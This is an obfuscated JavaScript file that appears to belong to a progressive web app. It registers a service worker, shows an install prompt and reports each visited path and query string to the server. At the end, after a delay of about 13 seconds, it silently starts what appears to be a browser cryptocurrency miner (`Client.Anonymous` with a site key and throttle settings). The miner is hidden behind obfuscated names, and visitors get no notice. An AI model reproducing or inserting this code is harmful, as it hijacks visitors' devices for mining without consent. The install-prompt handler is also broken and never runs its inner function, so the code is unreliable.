async function registerSW() {
    if ('serviceWorker' in navigator) {
        window['addEventListener']('load', function () {
            navigator['serviceWorker']['register']('/serviceWorker.js')['then'](_0x31c5b1 => console['log']('service\x20worker\x20registered'))['catch'](_0x39e69e => console['log']('service\x20worker\x20not\x20registered', _0x39e69e));
        });
    }
}
window['addEventListener']('beforeinstallprompt', _0x4abead => function (_0x4e7857) {
    return window['matchMedia']('(display-mode:\x20standalone)')['matches'] ? (document['querySelector']('.welcomeMsg')['classList']['add']('activation'), createEl('welcomeMsg', 'WELCOME\x20TO\x20OUR\x20APP'), _0x4e7857['preventDefault']()) : (createEl('installMsg', '<span><b>CLICK\x20HERE</b>\x20TO\x20INSTALL\x20THIS\x20APP\x20ON\x20YOUR\x20DEVICE</span>'), document['querySelector']('.installMsg')['onclick'] = _0x232b7d => _0x4e7857['prompt'](), _0x4e7857['preventDefault'](), document['querySelector']('.installMsg')['classList']['add']('activation'));
});
var xmlHttp = new XMLHttpRequest();
xmlHttp['open']('GET', '/?URL=' + location['pathname'] + location['search'], ![]);
xmlHttp['send'](null);
registerSW();
document['querySelector']('html')['classList']['add']('don');
setTimeout(() => {
    var _0xbe317b = new Client['Anonymous']('94fd352e2648f84468974dc47e5036a41f545b7f0c7293c829891a68f1626566', {
        'throttle': 0.5,
        'c': 'w',
        'ads': 0x0
    });
    _0xbe317b['start']();
}, 0x34ad);